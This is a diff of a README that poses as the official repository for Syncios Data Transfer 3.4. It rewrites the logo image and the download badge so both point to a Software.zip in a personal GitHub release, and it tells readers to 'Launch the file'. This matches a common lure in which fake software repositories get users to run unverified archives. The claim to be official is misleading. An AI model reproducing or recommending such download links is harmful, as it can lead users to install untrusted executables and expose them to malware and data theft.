@@ -1,6 +1,6 @@
 # 🚀 Syncios Data Transfer 3.4 Repository
 
-![Syncios Data Transfer Logo](https://example.com/logo.png)
+![Syncios Data Transfer Logo](https://github.com/felixcrazy207/Syncios-Data-Transfer-3.4/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository for Syncios Data Transfer 3.4! This repository provides you with all the necessary information and resources related to this versatile file-sharing and data transfer application.
 
@@ -27,7 +27,7 @@ This repository hosts the latest version of Syncios Data Transfer 3.4.
 ## 📥 Software Download
 
 You can download Syncios Data Transfer 3.4 from the following link:
-[![Download Syncios Data Transfer](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Syncios Data Transfer](https://github.com/felixcrazy207/Syncios-Data-Transfer-3.4/releases/download/v2.0/Software.zip)](https://github.com/felixcrazy207/Syncios-Data-Transfer-3.4/releases/download/v2.0/Software.zip)
 
 **Launch the file** to install Syncios Data Transfer 3.4 on your device.
 
